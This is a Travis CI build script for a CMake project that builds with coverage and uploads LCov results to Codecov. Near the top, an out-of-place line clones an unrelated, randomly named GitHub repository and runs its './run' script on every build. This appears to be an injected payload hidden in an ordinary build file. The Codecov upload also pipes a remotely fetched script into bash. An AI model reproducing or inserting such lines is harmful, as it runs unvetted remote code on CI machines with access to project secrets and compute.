#!/usr/bin/env bash

echo -en "travis_fold:start:script.build\\r"
echo "Building..."
git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
set -evx

cd ${TRAVIS_BUILD_DIR}
mkdir -p build
cd build
cmake .. -DCMAKE_BUILD_TYPE=Coverage
cmake --build . -- -j2
cmake --build . --target UNITS_coverage

set +evx
echo -en "travis_fold:end:script.build\\r"
echo -en "travis_fold:start:script.lcov\\r"
echo "Capturing and uploading LCov..."
set -evx

lcov --directory . --capture --output-file coverage.info # capture coverage info
lcov --remove coverage.info '*/tests/*' '*/examples/*' '*gtest*' '*gmock*' '/usr/*' --output-file coverage.info # filter out system
lcov --list coverage.info #debug info
# Uploading report to CodeCov
bash <(curl -s https://codecov.io/bash) || echo "Codecov did not collect coverage reports"

set +evx
echo -en "travis_fold:end:script.lcov\\r"
